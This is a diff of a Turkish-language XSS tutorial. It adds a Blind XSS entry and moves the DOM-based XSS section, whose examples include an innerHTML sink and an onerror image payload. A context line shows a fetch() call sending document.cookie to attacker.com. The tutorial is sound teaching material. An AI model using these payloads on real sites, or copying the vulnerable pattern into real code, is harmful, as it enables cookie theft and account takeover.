@@ -9,6 +9,7 @@ XSS, güvenlik açığı bulunan bir web uygulamasının kullanıcıya kötü am
 * Reflected XSS – Kötü amaçlı script, mevcut HTTP isteğinden gelir.
 * Stored XSS – Kötü amaçlı script, veritabanı gibi kalıcı bir depodan gelir.
 * DOM-based XSS – Açık, sunucu tarafında değil istemci tarafındaki JavaScript kodunda bulunur.
+* Blind XSS – Kötü amaçlı script, doğrudan kullanıcıya görünmeden genellikle yönetici panelleri, log dosyaları veya arka uç sistemlerinde tetiklenir ve saldırgan, payload’un çalıştığını bir call-back mekanizmasıyla gözlemler.
 
 ## Reflected XSS
 Reflected XSS, kullanıcının girdiği verinin sunucuya ulaştıktan sonra herhangi bir filtreleme veya sanitizasyon yapılmadan HTTP yanıtına dahil edilmesiyle oluşur.
@@ -45,22 +46,6 @@ Saldırgan şu şekilde veri gönderebilir:
 
 Bu içerik veritabanına kaydedilir ve her görüntülendiğinde çalışır.
 
-## DOM-based XSS
-DOM-based XSS, tamamen istemci tarafında (client-side) çalışan JavaScript kodunun kullanıcı girdisini filtrelemeden DOM’a yazması ile ortaya çıkar. Bu tür XSS, sunucuya gönderilen veri üzerinden değil, tarayıcıdaki Document Object Model (DOM) manipülasyonu ile tetiklenir.
-
-Örnek:
-```js
-var search = document.getElementById('search').value;
-var results = document.getElementById('results');
-results.innerHTML = 'You searched for: ' + search;
-```
-
-Eğer saldırgan `search` alanının değerini kontrol edebiliyorsa şu payload çalışabilir:
-
-```html
-<img src=1 onerror="alert('XSS')">
-```
-
 ## Blind XSS 
 Blind XSS, saldırganın payload’unun doğrudan kullanıcıya görünmeden, genellikle yönetici panelleri veya log sistemleri gibi arka planda çalışan alanlarda tetiklenmesiyle ortaya çıkar. Payload çalıştığında saldırgan, bir call-back mekanizmasıyla (ör. Burp Collaborator) tetiklemeyi gözlemler. Blind XSS için tipik bir payload, tetiklendiğinde saldırganın kontrolündeki bir sunucuya HTTP isteği gönderen basit bir JavaScript olabilir.
 Örnek:
@@ -78,6 +63,22 @@ fetch('https://attacker.com/log?cookie=' + document.cookie);
 ```
 
 Bu payload, kullanıcıya görünmeden arka planda çalışır ve saldırganın sunucusuna veri gönderir.
+
+## DOM-based XSS
+DOM-based XSS, tamamen istemci tarafında (client-side) çalışan JavaScript kodunun kullanıcı girdisini filtrelemeden DOM’a yazması ile ortaya çıkar. Bu tür XSS, sunucuya gönderilen veri üzerinden değil, tarayıcıdaki Document Object Model (DOM) manipülasyonu ile tetiklenir.
+
+Örnek:
+```js
+var search = document.getElementById('search').value;
+var results = document.getElementById('results');
+results.innerHTML = 'You searched for: ' + search;
+```
+
+Eğer saldırgan `search` alanının değerini kontrol edebiliyorsa şu payload çalışabilir:
+
+```html
+<img src=1 onerror="alert('XSS')">
+```
 
 ### Source & Sink
 DOM-based XSS’i anlamak için Source ve Sink kavramlarını bilmek önemlidir:
